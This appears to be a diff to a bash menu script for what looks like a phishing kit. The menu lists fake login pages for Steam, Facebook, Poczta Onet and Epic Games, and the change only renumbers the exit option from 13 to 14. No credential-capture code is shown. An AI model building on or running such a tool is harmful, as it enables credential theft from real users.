@@ -151,7 +151,7 @@ echo -e "\e[31m  [10] Steam\e[0m"
 echo -e "\e[31m  [11] Facebook Secure Page\e[0m"
 echo -e "\e[31m  [12] Poczta Onet\e[0m"
 echo -e "\e[31m  [13] Epic Games\e[0m"
-echo -e "\e[92m  [13] EXIT \e[0m"
+echo -e "\e[92m  [14] EXIT \e[0m"
 echo "================="
 
 
@@ -174,7 +174,7 @@ case "$opcja" in
   "11") facebook_secure_login_page ;;
   "12") poczta_onetlogin_page ;;
   "13") epicgames_login_page ;;
-  "13") exit_work ;;
+  "14") exit_work ;;
   *)  clear && ./run.sh
   
 esac
